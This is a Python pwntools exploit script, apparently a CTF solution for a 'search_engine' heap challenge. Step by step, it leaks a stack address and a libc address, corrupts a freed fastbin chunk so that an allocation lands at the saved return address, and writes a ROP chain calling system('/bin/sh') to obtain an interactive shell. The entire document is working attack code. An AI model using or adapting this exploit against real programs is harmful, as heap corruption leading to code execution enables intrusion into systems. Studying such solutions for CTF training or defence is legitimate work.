from pwn import *

r = process('./search_engine')

sl = lambda x:r.sendline(str(x))
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pr = 0x0000000000400e23

def menu():
  r.recvuntil('Quit')

def search(size, word):
  sl(1)
  r.recvuntil('size:')
  sl(size)
  r.recvuntil('word:')
  sl(word)

def add(size, word):
  sl(2)
  r.recvuntil('size:')
  sl(size)
  r.recvuntil('sentence:')
  sl(word)

def quit():
  sl(3)


# [*] Scenario
#   - First, leak stack addr using input function at menu select
#   - Second, leak libc addr using small bin (free)
#   - Third, overwrite fd from main_arena to ret using leaked stack addr.
#   - Last, get shell.

# First
menu()
sl('A')
r.recvuntil('number')
sl('A'*48)
r.recv(1)
stack = u64(r.recv(1024).split('A'*48)[1].split('is')[0][:-1]+'\x00\x00')
log.success("Stack Address : %s"%(hex(stack)))
stack_ret = stack + 0x22-8 
log.success("Stack Return Address : %s"%(hex(stack_ret)))

# Second
add(512,'A'*510+' B')
search(1,'B')
r.recvuntil('(y/n)?')
sl('y')
search(1,'\x00')
r.recvuntil(': ')
libcLeak = u64(r.recv(8))
libcBase = libcLeak-0x3c4b78
libcSystem = libcBase + elf.symbols['system']
libcBinsh = libcBase + 0x000000000018CD57
log.success("Libc Main Arena : %s"%(hex(libcLeak)))
log.success('Libc Base : %s'%(hex(libcBase)))
log.success('Libc System : %s'%(hex(libcSystem)))
log.success('Libc System : %s'%(hex(libcBinsh)))
sl('n')

# Third
menu()
add(54,'A'*52+' S')
menu()
add(54,'A'*52+' S')
menu()
add(54,'A'*52+' S')
menu()
search(1,'S')
r.recvuntil('(y/n)?')
sl('y')
r.recvuntil('(y/n)?')
sl('y')
r.recvuntil('(y/n)?')
sl('y')
'-----------'
search(1,'\x00')
r.recvuntil('(y/n)?')
sl('y')
r.recvuntil('(y/n)?')
sl('n')
r.recvuntil('(y/n)?')
sl('n')
payload = 'A'*30
payload += p64(pr)
payload += p64(libcBinsh)
payload += p64(libcSystem)
payload = payload.ljust(54)
elf.symbols['system']
menu()
add(54,p64(stack_ret).ljust(54))
menu()
add(54,'A'*54)
menu()
add(54,'A'*54)
menu()
raw_input()
add(54,payload)
r.interactive()

